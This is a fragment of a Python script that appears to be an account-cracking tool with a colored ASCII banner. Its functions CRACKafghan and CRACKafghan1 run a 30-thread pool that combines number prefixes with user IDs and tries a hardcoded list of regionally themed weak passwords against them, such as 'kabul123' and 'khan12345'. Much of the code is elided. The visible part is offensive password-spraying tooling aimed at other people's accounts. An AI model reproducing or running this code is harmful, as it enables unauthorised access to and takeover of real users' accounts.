...
logo=("""\033[1;37m                                                                                 
  _________ .__ .__           .__        __    .__                        \033[1;33m
\______   \|__||  |  _____   |  |      |  | __|  |__  _____     ____ \033[1;34m
 |    |  _/|  ||  |  \__  \  |  |      |  |/ /|  |  \ \__  \   /    \             \033[1;35m
 |    |   \|  ||  |__ / __ \_|  |__    |    < |   Y  \ / __ \_|   |  \          \033[1;36m
 |______  /|__||____/(____  /|____/    |__|_ \|___|  /(____           \033[1;37m  
        \/                \/                \/     \/      \/      \/                                               
...
def CRACKafghan():
		...
		with tred(max_workers=30) as CRACK:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'Bilal123','afghan1234','Janiman12345','١٢٣٤٥٦','500500','200300','800900','90009000','afghanistan','900900','10002000','600700','khan123','kabul123','khan12345','kabul12345']
				if mthd in ['1','01']:
...
def CRACKafghan1():
		user=[]
		clear()
		print('\033[1;33m             0344 0307 0308 0345 0301 03003......... ')
